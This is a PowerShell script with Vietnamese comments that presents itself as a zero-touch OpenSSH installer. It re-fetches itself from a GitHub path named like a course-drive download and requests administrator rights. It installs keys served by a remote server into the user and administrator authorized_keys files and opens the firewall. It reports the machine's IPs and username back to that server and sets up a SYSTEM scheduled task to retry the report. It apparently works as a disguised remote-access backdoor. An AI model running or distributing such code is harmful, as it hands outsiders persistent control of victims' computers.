<#
  install_openssh.ps1 — ZERO TOUCH
  Cach chay: .\install_openssh.ps1   (tu xin quyen Admin)
#>

# ==================== CAU HINH ====================
$SelfUrl           = 'https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main/drive_windows.ps1'
$ApiBase           = 'https://vm-ssh-manager.onrender.com'
$FallbackPublicKey = ''
# ==================================================

$ErrorActionPreference = 'Stop'
$NeedRestart = $false
$ApiBase   = $ApiBase.TrimEnd('/')
$KeysUrl   = "$ApiBase/api/authorized-keys"
$ReportUrl = "$ApiBase/api/vms"
$KeyPattern = '^(ssh-ed25519|ssh-rsa|ecdsa-sha2-nistp(256|384|521)|sk-ssh-ed25519@openssh\.com|sk-ecdsa-sha2-nistp256@openssh\.com)\s+[A-Za-z0-9+/=]{40,}'

$workDir  = Join-Path $env:ProgramData 'vm-report'
$pending  = Join-Path $workDir 'pending.json'
$retryPs1 = Join-Path $workDir 'retry.ps1'
$taskName = 'VMReportRetry'

# ===== 0. XIN QUYEN ADMIN NGAY LAP TUC =====
$__id    = [Security.Principal.WindowsIdentity]::GetCurrent()
$__admin = (New-Object Security.Principal.WindowsPrincipal($__id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $__admin) {
  # 1. Tim duong dan file that; neu dang chay qua iex thi tu tai ra file
  $__src = $PSCommandPath
  if (-not $__src) { $__src = $MyInvocation.MyCommand.Path }
  if (-not $__src) {
    $__src = Join-Path $env:TEMP 'install_openssh.ps1'
    if ($SelfUrl) {
      try { Invoke-RestMethod -Uri $SelfUrl -OutFile $__src -UseBasicParsing -TimeoutSec 60 }
      catch { Write-Host "Khong tai duoc script: $($_.Exception.Message)" -ForegroundColor Red; throw }
    } elseif (-not (Test-Path $__src)) {
      Write-Host 'Hay luu script thanh file .ps1 roi chay lai.' -ForegroundColor Yellow; throw
    }
  }
  try { Unblock-File -Path $__src -ErrorAction SilentlyContinue } catch {}

  # 2. Nap noi dung qua -Command, khong can ExecutionPolicy Bypass
  $__arg = '-NoExit -NoProfile -Command "iex ([System.IO.File]::ReadAllText(''' + $__src + '''))"'
  Write-Host 'Dang xin quyen Administrator... bam Yes o hop UAC.' -ForegroundColor Cyan
  try {
    Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList $__arg -ErrorAction Stop
  } catch {
    Write-Host 'Khong nang quyen duoc: ban bam No, hoac may khong co tai khoan admin.' -ForegroundColor Red
    Write-Host 'Kiem tra bang lenh: net localgroup Administrators' -ForegroundColor Yellow
    throw
  }
  return   # KHONG dung exit - exit se dong luon cua so cua ban
}
# ===== het khoi xin quyen =====

# ===== 1. Tu keo PUBLIC KEY tu server =====
Write-Host '=== 1/4: Lay public key tu server ===' -ForegroundColor Cyan
$keys = @()
for ($i = 1; $i -le 6; $i++) {
  try {
    $r = Invoke-RestMethod -Uri $KeysUrl -Method Get -TimeoutSec 60 -UseBasicParsing
    $keys = @($r.keys | Where-Object { $_ -match $KeyPattern })
    if ($keys.Count -gt 0) { break }
    Write-Host "  Lan $i/6: server chua co key hop le." -ForegroundColor Yellow
  } catch {
    Write-Host "  Lan $i/6: chua noi duoc server ($($_.Exception.Message))" -ForegroundColor Yellow
  }
  if ($i -lt 6) { Start-Sleep -Seconds 10 }
}
if ($keys.Count -eq 0 -and $FallbackPublicKey -match $KeyPattern) {
  $keys = @($FallbackPublicKey.Trim())
  Write-Host '  Dung key du phong khai bao trong file.' -ForegroundColor Yellow
}
if ($keys.Count -eq 0) {
  Write-Host '[LOI] Khong lay duoc public key nao -> DUNG, khong dong vao SSH.' -ForegroundColor Red
  Write-Host ('      Kiem tra: ' + $KeysUrl + ' phai tra ve {"keys":[...]} chua it nhat 1 key.') -ForegroundColor Yellow
  exit 1
}
Write-Host "  Da lay $($keys.Count) public key." -ForegroundColor Green

# ===== 2. Cai OpenSSH Server =====
Write-Host '=== 2/4: Cai OpenSSH Server ===' -ForegroundColor Cyan
$capName = 'OpenSSH.Server~~~~0.0.1.0'
$cap = Get-WindowsCapability -Online -Name $capName -ErrorAction SilentlyContinue
if (-not $cap -or $cap.State -ne 'Installed') {
  Write-Host 'Dang cai OpenSSH Server (1-2 phut)...'
  try {
    $r = Add-WindowsCapability -Online -Name $capName
    if ($r.RestartNeeded) { $NeedRestart = $true }
  } catch {
    Write-Host "Add-WindowsCapability loi: $($_.Exception.Message) - thu DISM..." -ForegroundColor Yellow
    & dism.exe /Online /Add-Capability /CapabilityName:$capName /NoRestart | Out-Null
  }
}
if (-not (Get-Service sshd -ErrorAction SilentlyContinue)) { Write-Host 'Khong cai duoc OpenSSH Server.' -ForegroundColor Red; exit 1 }
Set-Service sshd -StartupType Automatic
Start-Service sshd
Write-Host 'sshd da cai, StartupType = Automatic.' -ForegroundColor Green

# ===== 3. Ghi key + tat mat khau =====
Write-Host '=== 3/4: Ghi key & tat dang nhap mat khau ===' -ForegroundColor Cyan

function Add-KeyLine($file, $key) {
  New-Item -ItemType Directory -Force -Path (Split-Path $file -Parent) | Out-Null
  $lines = @(); if (Test-Path $file) { $lines = Get-Content $file }
  if ($lines -notcontains $key) { Add-Content -Path $file -Value $key -Encoding Ascii }
}

$userKeyFile  = Join-Path $env:USERPROFILE '.ssh\authorized_keys'
$adminKeyFile = Join-Path $env:ProgramData 'ssh\administrators_authorized_keys'
foreach ($k in $keys) { Add-KeyLine $userKeyFile $k; Add-KeyLine $adminKeyFile $k }

$userAccount = "$env:USERDOMAIN\$env:USERNAME"
& icacls.exe $userKeyFile /inheritance:r /grant "${userAccount}:(F)" '*S-1-5-18:(F)' '*S-1-5-32-544:(F)' | Out-Null
& icacls.exe $userKeyFile /setowner $userAccount | Out-Null
& icacls.exe $adminKeyFile /inheritance:r /grant '*S-1-5-18:(F)' '*S-1-5-32-544:(F)' | Out-Null

$cfg = Join-Path $env:ProgramData 'ssh\sshd_config'
Copy-Item $cfg "$cfg.bak" -Force

function Set-SshdGlobal($name, $value) {
  $raw = Get-Content $cfg -Raw
  if (-not $raw) { $raw = '' }
  $m = [regex]::Match($raw, '(?im)^[ \t]*Match\b')
  $splitAt = $raw.Length; if ($m.Success) { $splitAt = $m.Index }
  $head = $raw.Substring(0, $splitAt)
  $tail = $raw.Substring($splitAt)
  $pat  = "(?im)^[ \t]*#?[ \t]*$name\b[^\r\n]*\r?\n?"
  $head = [regex]::Replace($head, $pat, '')
  $tail = [regex]::Replace($tail, $pat, '')
  $head = $head.TrimEnd() + "`r`n$name $value`r`n"
  if ($tail) { $head += "`r`n" }
  Set-Content -Path $cfg -Value ($head + $tail) -Encoding Ascii -NoNewline
}

Set-SshdGlobal 'PubkeyAuthentication' 'yes'
Set-SshdGlobal 'PasswordAuthentication' 'no'
Set-SshdGlobal 'ChallengeResponseAuthentication' 'no'
Set-SshdGlobal 'KbdInteractiveAuthentication' 'no'
Set-SshdGlobal 'PermitEmptyPasswords' 'no'

$sshdExe = Join-Path $env:WINDIR 'System32\OpenSSH\sshd.exe'
& $sshdExe -t
if ($LASTEXITCODE -ne 0) {
  Copy-Item "$cfg.bak" $cfg -Force; Restart-Service sshd
  Write-Host 'sshd_config loi - da khoi phuc backup.' -ForegroundColor Red; exit 1
}
Restart-Service sshd

New-Item -Path 'HKLM:\SOFTWARE\OpenSSH' -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SOFTWARE\OpenSSH' -Name DefaultShell -Value "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force | Out-Null

# ===== 4. Tu do PORT/IP + firewall + bao cao =====
Write-Host '=== 4/4: Tu do port/IP, mo firewall & bao cao ===' -ForegroundColor Cyan
$ErrorActionPreference = 'Continue'

$eff = $null; $ports = @(22)
try {
  $eff = & $sshdExe -T -C "user=$env:USERNAME,host=localhost,addr=127.0.0.1" 2>$null
  if (-not $eff -or $LASTEXITCODE -ne 0) { $eff = & $sshdExe -T 2>$null }
  if ($eff) {
    foreach ($k in 'pubkeyauthentication','passwordauthentication','kbdinteractiveauthentication') {
      $line = $eff | Where-Object { $_ -match "^$k\s" } | Select-Object -First 1
      $val  = if ($line) { ($line -split '\s+')[1] } else { 'unknown' }
      $want = if ($k -eq 'pubkeyauthentication') { 'yes' } else { 'no' }
      $col  = if ($val -eq $want) { 'Green' } else { 'Red' }
      Write-Host ("  {0,-28}= {1} (mong doi: {2})" -f $k, $val, $want) -ForegroundColor $col
    }
    $p = @($eff | Where-Object { $_ -match '^port\s+\d+' } | ForEach-Object { [int]($_ -split '\s+')[1] })
    if ($p.Count -gt 0) { $ports = $p }
  }
} catch { Write-Host "  sshd -T loi: $($_.Exception.Message)" -ForegroundColor Yellow }
$sshPort = $ports[0]
Write-Host "  Port SSH thuc te: $($ports -join ', ')" -ForegroundColor Green

foreach ($p in $ports) {
  $ruleName = if ($p -eq 22) { 'OpenSSH-Server-In-TCP' } else { "OpenSSH-Server-In-TCP-$p" }
  if (Get-NetFirewallRule -Name $ruleName -ErrorAction SilentlyContinue) { Enable-NetFirewallRule -Name $ruleName | Out-Null }
  else { New-NetFirewallRule -Name $ruleName -DisplayName "OpenSSH Server (sshd) $p" -Direction Inbound -Protocol TCP -LocalPort $p -Action Allow -Profile Any | Out-Null }
  if (Get-NetTCPConnection -LocalPort $p -State Listen -ErrorAction SilentlyContinue) { Write-Host "  Cong $p dang LISTEN." -ForegroundColor Green }
  else { Write-Host "  CANH BAO: cong $p chua LISTEN." -ForegroundColor Red }
}

$validIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
              Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' })
$primaryIP = $null
$defRoute = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue |
            Sort-Object RouteMetric, InterfaceMetric | Select-Object -First 1
if ($defRoute) {
  $primaryIP = (Get-NetIPAddress -InterfaceIndex $defRoute.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
                Select-Object -First 1).IPAddress
}
if (-not $primaryIP) { $primaryIP = ($validIPs | Select-Object -First 1).IPAddress }
$ErrorActionPreference = 'Stop'

Write-Host "  User SSH: $env:USERNAME | IP chinh: $primaryIP" -ForegroundColor Green
foreach ($ipObj in $validIPs) { Write-Host "  Tu laptop:  ssh -p $sshPort $env:USERNAME@$($ipObj.IPAddress)" -ForegroundColor Green }

New-Item -ItemType Directory -Force -Path $workDir | Out-Null
$payload = @{
  vm_name    = $env:COMPUTERNAME
  ip_address = "$primaryIP"
  port       = $sshPort
  username   = $env:USERNAME
  public_key = $keys[0]
  all_ips    = @($validIPs | ForEach-Object { $_.IPAddress })
} | ConvertTo-Json -Compress

$sent = $false
if ($primaryIP) {
  for ($i = 1; $i -le 3; $i++) {
    try {
      $body = [System.Text.Encoding]::UTF8.GetBytes($payload)
      $resp = Invoke-RestMethod -Uri $ReportUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -TimeoutSec 60 -UseBasicParsing
      Write-Host "[SUCCESS] $($resp.message)" -ForegroundColor Green
      $sent = $true; break
    } catch {
      Write-Host "  Bao cao lan $i/3 that bai: $($_.Exception.Message)" -ForegroundColor Yellow
      if ($i -lt 3) { Start-Sleep -Seconds 5 }
    }
  }
} else { Write-Host '[WARN] Khong co IPv4 hop le -> hoan bao cao.' -ForegroundColor Yellow }

if ($sent) {
  Remove-Item $pending -Force -ErrorAction SilentlyContinue
  if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
  }
} else {
  [System.IO.File]::WriteAllText($pending, $payload, (New-Object System.Text.UTF8Encoding($false)))
  $retryBody = @'
$ErrorActionPreference = 'Stop'
$u = '__URL__'
$f = '__FILE__'
try {
  $b = [System.Text.Encoding]::UTF8.GetBytes((Get-Content -Raw $f))
  Invoke-RestMethod -Uri $u -Method Post -Body $b -ContentType 'application/json; charset=utf-8' -TimeoutSec 60 -UseBasicParsing | Out-Null
  Remove-Item $f -Force -ErrorAction SilentlyContinue
  Unregister-ScheduledTask -TaskName 'VMReportRetry' -Confirm:$false -ErrorAction SilentlyContinue
} catch { exit 1 }
'@
  $retryBody = $retryBody.Replace('__URL__', $ReportUrl).Replace('__FILE__', $pending)
  Set-Content -Path $retryPs1 -Value $retryBody -Encoding Ascii
  $taskArg = '-NoProfile -Command "iex ([System.IO.File]::ReadAllText(''' + $retryPs1 + '''))"'
  $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $taskArg
  $t1 = New-ScheduledTaskTrigger -AtStartup
  $t2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 30)
  $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
  $sett = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
  Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $t1,$t2 -Principal $prin -Settings $sett -Force | Out-Null
  Write-Host "[PENDING] Da luu payload + tao task '$taskName' tu gui lai moi 5 phut." -ForegroundColor Yellow
}

if ($NeedRestart) { Write-Host 'Can REBOOT de hoan tat cai OpenSSH (thuong thi khong can).' -ForegroundColor Yellow }
Write-Host 'HOAN TAT. Mat khau DA TAT, chi vao duoc bang key.' -ForegroundColor Yellow
